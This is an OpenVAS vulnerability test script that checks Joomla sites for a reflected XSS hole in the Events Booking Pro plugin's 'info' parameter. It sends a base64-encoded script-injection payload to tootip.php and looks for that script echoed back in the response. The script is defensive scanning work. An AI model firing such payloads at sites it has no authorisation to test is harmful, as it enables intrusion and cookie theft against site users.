###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_events_booking_pro_xss_vuln.nasl 2939 2016-03-24 08:47:34Z benallard $
#
# Joomla Joomseller Events Booking Pro 'info' Parameter XSS Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "
  Impact Level: Application";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.803851";
CPE = "cpe:/a:joomla:joomla";

if (description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 2939 $");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2016-03-24 09:47:34 +0100 (Thu, 24 Mar 2016) $");
  script_tag(name:"creation_date", value:"2013-08-06 14:53:07 +0530 (Tue, 06 Aug 2013)");
  script_name("Joomla Joomseller Events Booking Pro 'info' Parameter XSS Vulnerability");

  tag_summary =
"This host is running Joomla Joomseller Event Booking Pro plugin and
is prone to xss vulnerability.";

  tag_vuldetect =
"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.";

  tag_insight =
"Input passed via 'info' parameter to 'mod_eb_v5_mini_calendar/tmpl/tootip.php'
is not properly sanitised before being returned to the user.";

  tag_impact =
"Successful exploitation will allow remote attacker to execute arbitrary HTML
or script code and or discloses sensitive information resulting in loss of
confidentiality.";

  tag_affected =
"Joomla Components com_events_booking_v5 and com_jse_event before 1.0.3";

  tag_solution =
"Upgrade to JSE Event version 1.0.3,
For updates refer to http://joomseller.com/joomla-components/jse-event.html";


  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "vuldetect" , value : tag_vuldetect);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "impact" , value : tag_impact);
  script_xref(name : "URL" , value : "http://inter5.org/archives/262789");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/527775");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/na/joomseller-events-booking-pro-jse-event-cross-site-scripting");
  script_summary("Check if Joomla Event Booking Pro is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");
  exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

## Variable Initialization
url = "";
dir = "";
port = "";

## Get HTTP Port
port = get_app_port(cpe:CPE, nvt:SCRIPT_OID);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Installed Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port)){
  exit(0);
}

## Construct attack request
url = string(dir, '/modules/mod_eb_v5_mini_calendar/tmpl/tootip.php?info=' +
                  'eyJldmVudHMiOiI8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmxvY2F0aW' +
                  '9uKTs8L3NjcmlwdD4ifQ==');

## Check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header:TRUE,
               pattern:"><script>alert\(document.location\);</script>",
               extra_check:"com_events_booking"))
{
  security_message(port);
  exit(0);
}
